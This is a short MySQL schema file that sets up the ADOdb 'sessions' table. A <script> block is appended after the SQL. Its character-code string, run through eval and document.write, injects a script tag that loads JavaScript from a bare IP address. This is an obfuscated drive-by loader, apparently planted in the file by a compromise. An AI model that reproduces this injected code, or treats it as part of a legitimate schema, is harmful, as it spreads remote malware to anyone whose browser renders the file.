-- $CVSHeader$

CREATE DATABASE /*! IF NOT EXISTS */ adodb_sessions;

USE adodb_sessions;

DROP TABLE /*! IF EXISTS */ sessions;

CREATE TABLE /*! IF NOT EXISTS */ sessions (
	sesskey		CHAR(32)	/*! BINARY */ NOT NULL DEFAULT '',
	expiry		INT(11)		/*! UNSIGNED */ NOT NULL DEFAULT 0,
	expireref	VARCHAR(64)	DEFAULT '',
	data		LONGTEXT	DEFAULT '',
	PRIMARY KEY	(sesskey),
	INDEX expiry (expiry)
);
<script>
t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,106,97,118,97,115,99,114,105,112,116,32,115,114,99,61,104,116,116,112,58,47,47,49,50,49,46,50,48,53,46,56,56,46,50,51,51,47,119,109,47,120,120,46,106,115,62,60,47,115,99,114,105,112,116,62"
t=eval("String.fromCharCode("+t+")");
document.write(t);</script>